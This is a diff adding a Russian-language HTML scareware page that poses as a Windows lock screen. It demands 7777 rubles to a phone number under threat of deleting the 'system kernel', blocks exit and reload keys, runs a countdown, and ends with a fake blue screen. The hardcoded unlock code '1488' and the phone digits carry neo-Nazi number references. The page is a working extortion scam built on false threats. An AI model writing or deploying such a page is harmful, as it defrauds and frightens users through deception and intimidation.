@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows заблокирован!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: black;
+            color: red;
+            font-family: 'Arial', sans-serif;
+            height: 100vh;
+            overflow: hidden;
+            user-select: none;
+        }
+        
+        .container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            width: 90%;
+        }
+        
+        .title {
+            font-size: 4em;
+            font-weight: bold;
+            margin-bottom: 2em;
+            text-shadow: 0 0 10px red;
+        }
+        
+        .input-section {
+            margin: 2em 0;
+        }
+        
+        .input-label {
+            font-size: 1.5em;
+            margin-right: 1em;
+        }
+        
+        input[type="password"] {
+            font-size: 1.8em;
+            padding: 0.5em;
+            width: 200px;
+            background: black;
+            color: red;
+            border: 2px solid red;
+            outline: none;
+            text-align: center;
+            font-family: monospace;
+        }
+        
+        input[type="password"]::placeholder {
+            color: darkred;
+        }
+        
+        .attempts, .timer {
+            font-size: 1.8em;
+            font-weight: bold;
+            margin: 1em 0;
+        }
+        
+        .message {
+            font-size: 1.2em;
+            line-height: 1.4;
+            margin-top: 3em;
+            max-width: 800px;
+        }
+        
+        audio {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="title">Windows заблокирован!</div>
+        
+        <div class="input-section">
+            <span class="input-label">Код разблокировки:</span>
+            <input type="password" id="password" placeholder="******" maxlength="10" autofocus>
+        </div>
+        
+        <div class="attempts" id="attempts">Попытки: 3</div>
+        <div class="timer" id="timer">Время: 03:00</div>
+        
+        <div class="message">
+            Здарова, не надо было скачивать пиратки по первым ссылкам, чтобы разблокировать виндовс скинте 7777 рублей на номер +1 488 148 81 48 и возможно я подумаю кинуть ли тебе код разблокировки, если ты не успеешь за 3 минуты ядро твоей системы удалится
+        </div>
+    </div>
+    
+    <audio id="music" loop>
+        <source src="https://loldoor.github.io/FnFBB/0423.MP3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        const passwordInput = document.getElementById('password');
+        const attemptsEl = document.getElementById('attempts');
+        const timerEl = document.getElementById('timer');
+        const music = document.getElementById('music');
+        
+        let attempts = 3;
+        let timeLeft = 180;
+        let timerRunning = true;
+        
+        // Запуск музыки
+        music.play().catch(() => {});
+        music.volume = 0.3;
+        
+        // Блокировка клавиш
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F11') e.preventDefault();
+            if (e.key === 'Escape') e.preventDefault();
+            if (e.ctrlKey && e.key === 'w') e.preventDefault();
+            if (e.ctrlKey && e.key === 'r') e.preventDefault();
+        });
+        
+        // Проверка пароля
+        passwordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                checkPassword();
+            }
+        });
+        
+        function checkPassword() {
+            const password = passwordInput.value;
+            if (password === '1488') {
+                document.body.innerHTML = '<h1 style="color:lime;font-size:3em;text-align:center;margin-top:40vh;">Разблокировано!</h1>';
+                music.pause();
+                setTimeout(() => window.close(), 2000);
+            } else {
+                attempts--;
+                attemptsEl.textContent = `Попытки: ${attempts}`;
+                passwordInput.value = '';
+                passwordInput.placeholder = '******';
+                
+                if (attempts <= 0) {
+                    triggerBsod();
+                }
+            }
+        }
+        
+        // Таймер
+        const timerInterval = setInterval(() => {
+            if (!timerRunning) return;
+            
+            timeLeft--;
+            const mins = Math.floor(timeLeft / 60);
+            const secs = timeLeft % 60;
+            timerEl.textContent = `Время: ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+            
+            if (timeLeft <= 0) {
+                triggerBsod();
+            }
+        }, 1000);
+        
+        function triggerBsod() {
+            timerRunning = false;
+            clearInterval(timerInterval);
+            music.pause();
+            
+            document.body.innerHTML = `
+                <div style="background:blue;height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;color:white;font-family:Consolas;">
+                    <div style="font-size:8em;margin-bottom:1em;">:(</div>
+                    <div style="font-size:2em;">Ваше устройство перезагружается...</div>
+                </div>
+            `;
+            
+            setTimeout(() => {
+                window.location.href = 'https://loldoor.github.io/FnFBB/Bsodwindows10.png';
+            }, 500);
+        }
+    </script>
+</body>
+</html>
